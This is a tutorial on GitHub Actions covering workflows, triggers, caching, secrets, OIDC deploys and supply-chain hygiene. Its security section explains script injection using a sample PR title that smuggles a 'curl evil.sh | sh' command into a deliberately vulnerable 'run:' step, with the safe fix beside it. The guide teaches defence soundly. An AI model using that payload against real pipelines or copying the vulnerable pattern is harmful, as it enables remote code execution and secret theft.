# GitHub Actions in depth

Most job specs list "CI/CD", and in practice that usually means GitHub Actions.
You will be expected to read a workflow file, fix a red build, speed up a slow
one and add a deploy step without leaking secrets. This guide goes past the
basics in [ci-cd-pipelines](ci-cd-pipelines.md) into how Actions actually
executes, where the security traps are, and the patterns that keep pipelines
fast.

## The execution model

A **workflow** is a YAML file in `.github/workflows/`. It is triggered by
**events** and contains **jobs**; each job runs on a fresh **runner** (a VM or
container) and is made of **steps**, which either run shell commands or use an
**action**.

| Concept | Scope | Shares a filesystem with |
| --- | --- | --- |
| step | one command or action | other steps in the same job |
| job | one runner | nothing; a new machine each time |
| workflow | one or more jobs | nothing, except artifacts and caches |

Jobs run in parallel unless you declare `needs`. Because each job starts on a
clean machine, anything a later job needs (a build output, a test report) must
be passed explicitly with artifacts, or rebuilt.

```yaml
name: ci
on:
  pull_request:
  push:
    branches: [main]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm test
```

## Triggers worth knowing

| Event | Fires on | Typical use |
| --- | --- | --- |
| `pull_request` | PR opened or updated | lint, test, build |
| `push` (branch filter) | commits landing on a branch | deploy from `main` |
| `workflow_dispatch` | a manual button, with inputs | ad-hoc deploys, backfills |
| `schedule` (cron, UTC) | a timetable | nightly dependency or link checks |
| `release` / tag push | a published release or `v*` tag | publish packages |
| `workflow_call` | another workflow calling this one | reusable pipelines |

`paths` and `paths-ignore` filters stop a docs-only change running the whole
backend suite. Scheduled workflows run on the default branch only, and GitHub
disables them in repositories with no activity for 60 days.

## Matrices and dependencies between jobs

A matrix fans one job out over combinations:

```yaml
jobs:
  test:
    strategy:
      fail-fast: false
      matrix:
        node: [22, 24]
        os: [ubuntu-latest, windows-latest]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "${{ matrix.node }}" }
      - run: npm ci && npm test
```

`fail-fast: false` lets the other combinations finish so you can see whether a
failure is specific to one platform. Chain jobs with `needs`, and pass values
between them with job `outputs`:

```yaml
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.meta.outputs.image }}
    steps:
      - id: meta
        run: echo "image=myapi:${GITHUB_SHA::7}" >> "$GITHUB_OUTPUT"
  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.image }}"
```

## Caching versus artifacts

They are often confused:

| | Cache | Artifact |
| --- | --- | --- |
| Purpose | speed up repeated work | hand files to a later job or a human |
| Keyed by | a key you compute, such as the lockfile hash | name, within one run |
| Guaranteed to exist | no; a miss must still work | yes, within retention |
| Example | npm or NuGet package cache | built `dist/`, test reports, coverage |

`setup-node`'s `cache: npm` caches the npm download cache keyed on the
lockfile; `npm ci` still installs, just without network downloads. For .NET,
cache `~/.nuget/packages` keyed on `**/packages.lock.json` or the project files.
Never cache `node_modules` across OS or Node versions, and never let a cache
decide correctness: a stale cache should only make a build slower, not wrong.

## Secrets, variables and environments

Secrets are encrypted per repository, organisation or **environment** and
exposed as `${{ secrets.NAME }}`. GitHub masks their values in logs, but
masking is best effort: a secret transformed (base64, split) prints in clear.

**Environments** (`production`, `staging`) add protection rules: required
reviewers, wait timers, and branch restrictions, so the production deploy job
cannot run from a random branch:

```yaml
  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    environment: production
    runs-on: ubuntu-latest
```

Secrets are **not** passed to workflows triggered by pull requests from forks,
which is deliberate: otherwise anyone could open a PR that prints them.

### Permissions and the `GITHUB_TOKEN`

Each run gets an automatic `GITHUB_TOKEN` scoped to the repository. Set its
permissions explicitly and minimally at the top of the workflow:

```yaml
permissions:
  contents: read
```

Grant more per job only where needed (`packages: write` to push to GHCR,
`pull-requests: write` to comment). A compromised step with a write-all token
can push code or tamper with releases.

## Deploying without long-lived cloud keys

Storing an AWS or Azure access key as a secret works, but it is a permanent
credential waiting to leak. The modern approach is **OIDC federation**: the
job requests a signed identity token from GitHub, and your cloud trusts tokens
from that repository, branch or environment in exchange for short-lived
credentials.

```yaml
permissions:
  id-token: write
  contents: read
steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123456789012:role/deploy-api
      aws-region: eu-west-2
```

Scope the cloud-side trust to `repo:acme/api:environment:production` so a
workflow on a feature branch cannot assume the production role. Azure and GCP
have equivalent federated credentials.

## Supply-chain hygiene

Actions are code from other people running with your token and secrets.

- **Pin third-party actions to a full commit SHA**, not a tag. Tags can be
  moved, and in 2025 a popular action's tags were repointed to malicious code
  that dumped secrets into logs. First-party `actions/*` on major tags is a
  common, lower-risk compromise; Dependabot can keep SHAs up to date.
- **Never interpolate untrusted input into `run:`.** A PR title such as
  `"; curl evil.sh | sh #` becomes shell code:

```yaml
# Vulnerable: the title is pasted into the script
- run: echo "${{ github.event.pull_request.title }}"
# Safe: pass it as an environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

- Be very careful with `pull_request_target`: it runs with secrets and a write
  token in the context of the base repository. Never check out and run the
  PR's code in it.

### Sharing pipelines: reusable workflows and composite actions

When five repositories share the same build, extract it:

- A **reusable workflow** (`on: workflow_call`) is a whole workflow with jobs,
  called with `uses: org/pipelines/.github/workflows/node-ci.yml@v2`.
- A **composite action** bundles steps into one step, good for "set up our
  toolchain" sequences.

Both keep pipelines consistent and let a security fix land everywhere at once.

## Keeping it fast and cheap

- `concurrency` cancels superseded runs on the same PR:

```yaml
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true
```

- Set `timeout-minutes` on jobs; the default is six hours, and a hung test can
  burn a lot of paid minutes.
- Split slow suites across matrix shards (`--shard=1/4` in Vitest and
  Playwright).
- Run cheap checks (lint, type-check) in parallel with tests rather than before
  them, unless you want the fast fail.

## Debugging a failing workflow

1. Read the first error, not the last; later failures are often consequences.
2. Check what differs from your machine: runtime version, OS, time zone,
   case-sensitive filesystem, missing secrets on fork PRs.
3. Re-run with debug logging (`ACTIONS_STEP_DEBUG` set to `true`, or "Enable
   debug logging" when re-running).
4. Reproduce locally with the same commands, or with `act` for simple
   workflows.
5. If it passes on retry, treat it as a flaky test to fix, not a pass.

## What you should be able to answer

- Why can't a second job read files the first job built, and how do you pass
  them?
- What is the difference between a cache and an artifact?
- How do you deploy to a cloud from Actions without storing a long-lived key?
- Why pin third-party actions to a commit SHA, and what is script injection in
  a workflow?
- How do you make sure only `main` can deploy to production, with approval?
- A workflow takes 25 minutes. Name three concrete ways to cut it down.
